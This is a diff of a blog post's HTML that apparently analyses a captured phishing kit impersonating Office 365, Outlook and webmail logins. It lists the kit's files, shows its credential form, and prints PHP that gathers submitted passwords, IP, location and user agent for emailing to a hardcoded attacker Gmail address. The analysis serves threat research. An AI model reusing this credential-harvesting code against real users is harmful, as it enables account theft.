+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sha256sum u.zip
+</span></span><span class="line"><span class="cl">c9079c6f6576da99f979b637c358a45f89c7187ddb80edf9e7fb2d9500880173  u.zip</span></span></code></pre></div>
+<figure class="align-center ">
+    <img loading="lazy" src="/images/posts/phishing-findings/ep1/vtuzip.png#center"
+         alt="uzip on VirusTotal"/> <figcaption>
+            <p><a href="https://www.virustotal.com/gui/file/c9079c6f6576da99f979b637c358a45f89c7187ddb80edf9e7fb2d9500880173/detection" target="_blank" rel="noopener">u.zip on VirusTotal</a></p>
         </figcaption>
 </figure>
 
-<h2 id="explore-the-kit">Explore the kit</h2>
+<h2 id="explore-the-kit">Explore the kit<a hidden class="anchor" aria-hidden="true" href="#explore-the-kit">#</a></h2>
 <p>When extracting the archive, we can see the following structure:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>u
-</span></span><span style="display:flex;"><span>├── aol.php
-</span></span><span style="display:flex;"><span>├── css
-</span></span><span style="display:flex;"><span>│   ├── bootstrap.min.css
-</span></span><span style="display:flex;"><span>│   └── style.css
-</span></span><span style="display:flex;"><span>├── emailcode
-</span></span><span style="display:flex;"><span>│   └── email.php
-</span></span><span style="display:flex;"><span>├── images
-</span></span><span style="display:flex;"><span>│   ├── landing-devices-bg.jpg
-</span></span><span style="display:flex;"><span>│   ├── mail.png
-</span></span><span style="display:flex;"><span>│   ├── microbg.jpg
-</span></span><span style="display:flex;"><span>│   ├── microsoftlogo.png
-</span></span><span style="display:flex;"><span>│   ├── mobile-img.png
-</span></span><span style="display:flex;"><span>│   ├── officebg.jpg
-</span></span><span style="display:flex;"><span>│   ├── officelogo.png
-</span></span><span style="display:flex;"><span>│   ├── office.png
-</span></span><span style="display:flex;"><span>│   ├── Onedrive-logo.png
-</span></span><span style="display:flex;"><span>│   ├── outlook.png
-</span></span><span style="display:flex;"><span>│   └── webmaillogo.png
-</span></span><span style="display:flex;"><span>├── index.php
-</span></span><span style="display:flex;"><span>├── js
-</span></span><span style="display:flex;"><span>│   └── bootstrap.min.js
-</span></span><span style="display:flex;"><span>├── microsoft.php
-</span></span><span style="display:flex;"><span>├── office.php
-</span></span><span style="display:flex;"><span>├── outlookcode
-</span></span><span style="display:flex;"><span>│   └── email.php
-</span></span><span style="display:flex;"><span>└── webmail.php
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">u
+</span></span><span class="line"><span class="cl">├── aol.php
+</span></span><span class="line"><span class="cl">├── css
+</span></span><span class="line"><span class="cl">│   ├── bootstrap.min.css
+</span></span><span class="line"><span class="cl">│   └── style.css
+</span></span><span class="line"><span class="cl">├── emailcode
+</span></span><span class="line"><span class="cl">│   └── email.php
+</span></span><span class="line"><span class="cl">├── images
+</span></span><span class="line"><span class="cl">│   ├── landing-devices-bg.jpg
+</span></span><span class="line"><span class="cl">│   ├── mail.png
+</span></span><span class="line"><span class="cl">│   ├── microbg.jpg
+</span></span><span class="line"><span class="cl">│   ├── microsoftlogo.png
+</span></span><span class="line"><span class="cl">│   ├── mobile-img.png
+</span></span><span class="line"><span class="cl">│   ├── officebg.jpg
+</span></span><span class="line"><span class="cl">│   ├── officelogo.png
+</span></span><span class="line"><span class="cl">│   ├── office.png
+</span></span><span class="line"><span class="cl">│   ├── Onedrive-logo.png
+</span></span><span class="line"><span class="cl">│   ├── outlook.png
+</span></span><span class="line"><span class="cl">│   └── webmaillogo.png
+</span></span><span class="line"><span class="cl">├── index.php
+</span></span><span class="line"><span class="cl">├── js
+</span></span><span class="line"><span class="cl">│   └── bootstrap.min.js
+</span></span><span class="line"><span class="cl">├── microsoft.php
+</span></span><span class="line"><span class="cl">├── office.php
+</span></span><span class="line"><span class="cl">├── outlookcode
+</span></span><span class="line"><span class="cl">│   └── email.php
+</span></span><span class="line"><span class="cl">└── webmail.php
 </span></span></code></pre></div><p>I usually start the analysis from the entrypoint: so, in this case, <code>index.php</code>. If we look at the div having the class <code>loginform</code>, we can find an interesting feature of this kit: it gives the user three options to login (Office365, Outlook and &lsquo;other mail&rsquo;).</p>
 <p>Here is how it looks in the code and in the browser:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;loginform&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;office.php&#34;</span>  <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;loginoffice&#34;</span>&gt;Login with Office 365&lt;/<span style="color:#f92672">a</span>&gt;
-</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;microsoft.php&#34;</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;loginoutlook&#34;</span>&gt;Login with Outlook&lt;/<span style="color:#f92672">a</span>&gt;
-</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;webmail.php&#34;</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;loginmail&#34;</span>&gt;Login with Other Mail&lt;/<span style="color:#f92672">a</span>&gt;
-</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">div</span>&gt;
-</span></span></code></pre></div><figure><img src="/images/posts/phishing-findings/ep1/indexphp.png"
-         alt="How this phishing kit looks like when deployed"/><figcaption>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;loginform&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;office.php&#34;</span>  <span class="na">class</span><span class="o">=</span><span class="s">&#34;loginoffice&#34;</span><span class="p">&gt;</span>Login with Office 365<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;microsoft.php&#34;</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;loginoutlook&#34;</span><span class="p">&gt;</span>Login with Outlook<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;webmail.php&#34;</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;loginmail&#34;</span><span class="p">&gt;</span>Login with Other Mail<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span></span></span></code></pre></div>
+<figure class="align-center ">
+    <img loading="lazy" src="/images/posts/phishing-findings/ep1/indexphp.png#center"
+         alt="Screenshot of the phishing page"/> <figcaption>
             <p>How this phishing kit looks like when deployed</p>
         </figcaption>
 </figure>
 
-<h2 id="exfiltration-method">Exfiltration method</h2>
+<h2 id="exfiltration-method">Exfiltration method<a hidden class="anchor" aria-hidden="true" href="#exfiltration-method">#</a></h2>
 <p>The three PHP files referenced from <code>index.php</code> all include <code>emailcode/email.php</code> in the <code>action</code> of the form containing input fields for the credentials. Here is the form in one of them, specifically <code>webmail.php</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;webmail&#34;</span> <span style="color:#a6e22e">methed</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;post&#34;</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;emailcode/email.php&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>   &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;form-group orangeclr&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>       &lt;<span style="color:#f92672">label</span> <span style="color:#a6e22e">for</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;email&#34;</span>&gt;Email Address&lt;/<span style="color:#f92672">label</span>&gt;
-</span></span><span style="display:flex;"><span>       &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;input-group mb-2 mr-sm-2 mb-sm-0&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>           &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;input-group-addon&#34;</span> <span style="color:#a6e22e">style</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width: 2.6rem&#34;</span>&gt;&lt;<span style="color:#f92672">i</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;fa fa-at&#34;</span>&gt;&lt;/<span style="color:#f92672">i</span>&gt;&lt;/<span style="color:#f92672">div</span>&gt;
-</span></span><span style="display:flex;"><span>           &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;email&#34;</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;form-control&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;email&#34;</span>
-</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">placeholder</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;you@example.com&#34;</span> <span style="color:#a6e22e">required</span> <span style="color:#a6e22e">autofocus</span>&gt;
-</span></span><span style="display:flex;"><span>       &lt;/<span style="color:#f92672">div</span>&gt;
-</span></span><span style="display:flex;"><span>   &lt;/<span style="color:#f92672">div</span>&gt;
-</span></span><span style="display:flex;"><span>   &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;form-group orangeclr&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>       &lt;<span style="color:#f92672">label</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span> <span style="color:#a6e22e">for</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;password&#34;</span>&gt;Password&lt;/<span style="color:#f92672">label</span>&gt;
-</span></span><span style="display:flex;"><span>       &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;input-group mb-2 mr-sm-2 mb-sm-0&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>           &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;input-group-addon&#34;</span> <span style="color:#a6e22e">style</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width: 2.6rem&#34;</span>&gt;&lt;<span style="color:#f92672">i</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;fa fa-key&#34;</span>&gt;&lt;/<span style="color:#f92672">i</span>&gt;&lt;/<span style="color:#f92672">div</span>&gt;
-</span></span><span style="display:flex;"><span>           &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;password&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;password&#34;</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;form-control&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;password&#34;</span>
-</span></span><span style="display:flex;"><span>                  <span style="color:#a6e22e">placeholder</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Password&#34;</span> <span style="color:#a6e22e">required</span>&gt;
-</span></span><span style="display:flex;"><span>       &lt;/<span style="color:#f92672">div</span>&gt;
-</span></span><span style="display:flex;"><span>   &lt;/<span style="color:#f92672">div</span>&gt;
-</span></span><span style="display:flex;"><span>   &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;gostepbtn&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>       &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit_btn&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Go to step 2&#34;</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;gostep&#34;</span> /&gt;
-</span></span><span style="display:flex;"><span>   &lt;/<span style="color:#f92672">div</span>&gt;
-</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">form</span>&gt;
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">form</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;webmail&#34;</span> <span class="na">methed</span><span class="o">=</span><span class="s">&#34;post&#34;</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;emailcode/email.php&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">   <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;form-group orangeclr&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">       <span class="p">&lt;</span><span class="nt">label</span> <span class="na">for</span><span class="o">=</span><span class="s">&#34;email&#34;</span><span class="p">&gt;</span>Email Address<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">       <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;input-group mb-2 mr-sm-2 mb-sm-0&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">           <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;input-group-addon&#34;</span> <span class="na">style</span><span class="o">=</span><span class="s">&#34;width: 2.6rem&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">	   <span class="p">&lt;</span><span class="nt">i</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;fa fa-at&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">i</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">	   <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">           <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;email&#34;</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;form-control&#34;</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;email&#34;</span>
+</span></span><span class="line"><span class="cl">                    <span class="na">placeholder</span><span class="o">=</span><span class="s">&#34;you@example.com&#34;</span> <span class="na">required</span> <span class="na">autofocus</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">       <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">   <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">   <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;form-group orangeclr&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">       <span class="p">&lt;</span><span class="nt">label</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;&#34;</span> <span class="na">for</span><span class="o">=</span><span class="s">&#34;password&#34;</span><span class="p">&gt;</span>Password<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">       <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;input-group mb-2 mr-sm-2 mb-sm-0&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">           <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;input-group-addon&#34;</span> <span class="na">style</span><span class="o">=</span><span class="s">&#34;width: 2.6rem&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">	   <span class="p">&lt;</span><span class="nt">i</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;fa fa-key&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">i</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">	   <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">           <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;password&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;password&#34;</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;form-control&#34;</span>
+</span></span><span class="line"><span class="cl">		<span class="na">id</span><span class="o">=</span><span class="s">&#34;password&#34;</span> <span class="na">placeholder</span><span class="o">=</span><span class="s">&#34;Password&#34;</span> <span class="na">required</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">       <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">   <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">   <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;gostepbtn&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">       <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;submit_btn&#34;</span>
+</span></span><span class="line"><span class="cl">	    <span class="na">value</span><span class="o">=</span><span class="s">&#34;Go to step 2&#34;</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;gostep&#34;</span> <span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl">   <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
 </span></span></code></pre></div><p>After the victim enters the credentials, these are sent to <code>emailcode/email.php</code> with a POST. Let&rsquo;s check what happens in there:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_REQUEST[<span style="color:#e6db74">&#39;submit_btn&#39;</span>])){
-</span></span><span style="display:flex;"><span>    $admin_email <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;macdon161@gmail.com&#34;</span>;
-</span></span><span style="display:flex;"><span>    $email <span style="color:#f92672">=</span> $_REQUEST[<span style="color:#e6db74">&#39;email&#39;</span>];
-</span></span><span style="display:flex;"><span>    $password <span style="color:#f92672">=</span> $_REQUEST[<span style="color:#e6db74">&#39;password&#39;</span>];
-</span></span><span style="display:flex;"><span>    $ip <span style="color:#f92672">=</span> <span style="color:#a6e22e">getenv</span>(<span style="color:#e6db74">&#34;REMOTE_ADDR&#34;</span>);
-</span></span><span style="display:flex;"><span>    $country <span style="color:#f92672">=</span> <span style="color:#a6e22e">ip_visitor_country</span>();
-</span></span><span style="display:flex;"><span>    $region <span style="color:#f92672">=</span> <span style="color:#a6e22e">ip_visitor_region</span>();
-</span></span><span style="display:flex;"><span>    $city <span style="color:#f92672">=</span> <span style="color:#a6e22e">ip_visitor_city</span>();
-</span></span><span style="display:flex;"><span>    $adddate <span style="color:#f92672">=</span> <span style="color:#a6e22e">date</span>(<span style="color:#e6db74">&#34;D M d, Y g:i a&#34;</span>);
-</span></span><span style="display:flex;"><span>    $browser <span style="color:#f92672">=</span> $_SERVER[<span style="color:#e6db74">&#39;HTTP_USER_AGENT&#39;</span>];
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;submit_btn&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$admin_email</span> <span class="o">=</span> <span class="s2">&#34;macdon161@gmail.com&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$email</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;email&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$password</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$ip</span> <span class="o">=</span> <span class="nx">getenv</span><span class="p">(</span><span class="s2">&#34;REMOTE_ADDR&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$country</span> <span class="o">=</span> <span class="nx">ip_visitor_country</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$region</span> <span class="o">=</span> <span class="nx">ip_visitor_region</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$city</span> <span class="o">=</span> <span class="nx">ip_visitor_city</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$adddate</span> <span class="o">=</span> <span class="nx">date</span><span class="p">(</span><span class="s2">&#34;D M d, Y g:i a&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$browser</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_USER_AGENT&#39;</span><span class="p">];</span>
 </span></span></code></pre></div><p><code>admin_email</code> contains the exfiltration email address for this instance of the phishing kit. So we can confirm that information is sent directly via email to the address specified in the variable.</p>
 <p>As it is possible to see in the code above, the email sent includes multiple information: credentials, IP address, date and User-Agent string. The kit also tries to obtain the country, region and city where the request was generated by performing a request to <em>geoplugin.net</em> with <code>curl_init</code> and providing the IP address. However - as of now - the service has moved to <em>geoplugin.com</em>, thus these information cannot currently be collected by the kit.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">// Always set content-type when sending HTML email
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$formname <span style="color:#f92672">=</span> $_REQUEST[<span style="color:#e6db74">&#39;logintype&#39;</span>];
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">switch</span> ($formname) {
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#34;office&#34;</span><span style="color:#f92672">:</span>
-</span></span><span style="display:flex;"><span>        $message <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;Login Type Selection -- Office </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
-</span></span><span style="display:flex;"><span>        $subject <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Office login attempt -- &#34;</span><span style="color:#f92672">.</span>$ip;
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#34;outlook&#34;</span><span style="color:#f92672">:</span>
-</span></span><span style="display:flex;"><span>        $message <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;Login Type Selection -- Outlook </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
-</span></span><span style="display:flex;"><span>        $subject <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Outlook login attempt -- &#34;</span><span style="color:#f92672">.</span>$ip;
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#34;webmail&#34;</span><span style="color:#f92672">:</span>
-</span></span><span style="display:flex;"><span>        $message <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;Login Type Selection -- Webmail </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
-</span></span><span style="display:flex;"><span>        $subject <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Webmail login attempt -- &#34;</span><span style="color:#f92672">.</span>$ip;
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
-</span></span><span style="display:flex;"><span>        $message <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;Login Type Selection -- other </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
-</span></span><span style="display:flex;"><span>        $subject <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;other login attempt -- &#34;</span><span style="color:#f92672">.</span>$ip;
-</span></span><span style="display:flex;"><span>}
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// Always set content-type when sending HTML email
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$formname</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;logintype&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="k">switch</span> <span class="p">(</span><span class="nv">$formname</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="s2">&#34;office&#34;</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$message</span> <span class="o">.=</span> <span class="s2">&#34;Login Type Selection -- Office </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$subject</span> <span class="o">=</span> <span class="s2">&#34;Office login attempt -- &#34;</span><span class="o">.</span><span class="nv">$ip</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="s2">&#34;outlook&#34;</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$message</span> <span class="o">.=</span> <span class="s2">&#34;Login Type Selection -- Outlook </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$subject</span> <span class="o">=</span> <span class="s2">&#34;Outlook login attempt -- &#34;</span><span class="o">.</span><span class="nv">$ip</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="s2">&#34;webmail&#34;</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$message</span> <span class="o">.=</span> <span class="s2">&#34;Login Type Selection -- Webmail </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$subject</span> <span class="o">=</span> <span class="s2">&#34;Webmail login attempt -- &#34;</span><span class="o">.</span><span class="nv">$ip</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">default</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$message</span> <span class="o">.=</span> <span class="s2">&#34;Login Type Selection -- other </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$subject</span> <span class="o">=</span> <span class="s2">&#34;other login attempt -- &#34;</span><span class="o">.</span><span class="nv">$ip</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
